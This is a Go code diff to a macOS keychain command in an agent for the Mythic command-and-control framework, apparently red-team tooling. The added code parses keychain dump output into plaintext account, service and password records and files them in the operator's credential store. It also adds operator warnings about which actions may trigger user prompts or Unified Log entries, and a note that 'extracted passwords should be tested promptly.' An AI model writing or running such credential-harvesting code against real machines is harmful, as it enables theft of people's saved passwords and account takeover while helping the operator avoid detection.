@@ -2,8 +2,10 @@ package agentfunctions
 
 import (
 	"fmt"
+	"strings"
 
 	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
+	"github.com/MythicMeta/MythicContainer/mythicrpc"
 )
 
 func init() {
@@ -50,12 +52,13 @@ func init() {
 				},
 			},
 			{
-				Name:             "server",
-				ModalDisplayName: "Server",
-				CLIName:          "server",
-				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
-				Description:      "Server hostname to search for (find-internet). Example: github.com",
-				DefaultValue:     "",
+				Name:                 "server",
+				ModalDisplayName:     "Server",
+				CLIName:              "server",
+				ParameterType:        agentstructs.COMMAND_PARAMETER_TYPE_STRING,
+				Description:          "Server hostname to search for (find-internet). Example: github.com",
+				DefaultValue:         "",
+				DynamicQueryFunction: getActiveHostList,
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{
 						ParameterIsRequired: false,
@@ -114,6 +117,92 @@ func init() {
 		},
 		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
 			return args.LoadArgsFromDictionary(input)
+		},
+		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
+			response := agentstructs.PTTaskProcessResponseMessageResponse{
+				TaskID:  processResponse.TaskData.Task.ID,
+				Success: true,
+			}
+			responseText, ok := processResponse.Response.(string)
+			if !ok || responseText == "" {
+				return response
+			}
+			action, _ := processResponse.TaskData.Args.GetStringArg("action")
+			if action != "find-password" && action != "find-internet" {
+				return response
+			}
+			// Parse macOS security command output for password entries
+			// Format: "password: \"value\"" or "password: 0x..." lines
+			hostname := processResponse.TaskData.Callback.Host
+			var creds []mythicrpc.MythicRPCCredentialCreateCredentialData
+			var account, service string
+			for _, line := range strings.Split(responseText, "\n") {
+				line = strings.TrimSpace(line)
+				if strings.Contains(line, `"acct"`) && strings.Contains(line, "=") {
+					parts := strings.SplitN(line, "=", 2)
+					if len(parts) == 2 {
+						account = strings.Trim(strings.TrimSpace(parts[1]), `"`)
+					}
+				} else if strings.Contains(line, `"svce"`) && strings.Contains(line, "=") {
+					parts := strings.SplitN(line, "=", 2)
+					if len(parts) == 2 {
+						service = strings.Trim(strings.TrimSpace(parts[1]), `"`)
+					}
+				} else if strings.Contains(line, `"srvr"`) && strings.Contains(line, "=") {
+					parts := strings.SplitN(line, "=", 2)
+					if len(parts) == 2 {
+						service = strings.Trim(strings.TrimSpace(parts[1]), `"`)
+					}
+				} else if strings.HasPrefix(line, "password:") {
+					pass := strings.TrimSpace(strings.TrimPrefix(line, "password:"))
+					pass = strings.Trim(pass, `"`)
+					if pass != "" && !strings.HasPrefix(pass, "0x") && account != "" {
+						realm := hostname
+						if service != "" {
+							realm = service
+						}
+						creds = append(creds, mythicrpc.MythicRPCCredentialCreateCredentialData{
+							CredentialType: "plaintext",
+							Realm:          realm,
+							Account:        account,
+							Credential:     pass,
+							Comment:        fmt.Sprintf("keychain (%s)", action),
+						})
+					}
+				}
+			}
+			registerCredentials(processResponse.TaskData.Task.ID, creds)
+			return response
+		},
+		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
+			action, _ := taskData.Args.GetStringArg("action")
+			msg := "OPSEC WARNING: Accessing macOS Keychain. "
+			switch action {
+			case "dump":
+				msg += "Dumping all keychain metadata. May trigger macOS security prompts if accessing login keychain items."
+			case "find-password", "find-internet":
+				msg += "Searching for passwords. macOS may display a system authorization prompt asking the user to allow keychain access."
+			case "find-cert":
+				msg += "Searching for certificates. Less likely to trigger prompts but accesses the certificate trust store."
+			default:
+				msg += "Enumerating keychains (low risk)."
+			}
+			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
+				TaskID:             taskData.Task.ID,
+				Success:            true,
+				OpsecPreBlocked:    false,
+				OpsecPreMessage:    msg,
+				OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
+			}
+		},
+		TaskFunctionOPSECPost: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskOPSECPostTaskMessageResponse {
+			return agentstructs.PTTaskOPSECPostTaskMessageResponse{
+				TaskID:              taskData.Task.ID,
+				Success:             true,
+				OpsecPostBlocked:    false,
+				OpsecPostMessage:    "OPSEC AUDIT: macOS Keychain accessed. Keychain access generates entries in the Unified Log (subsystem: com.apple.securityd). If keychain UI prompts are enabled, the user may see an access dialog. Extracted passwords should be tested promptly.",
+				OpsecPostBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
+			}
 		},
 		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
 			response := agentstructs.PTTaskCreateTaskingMessageResponse{
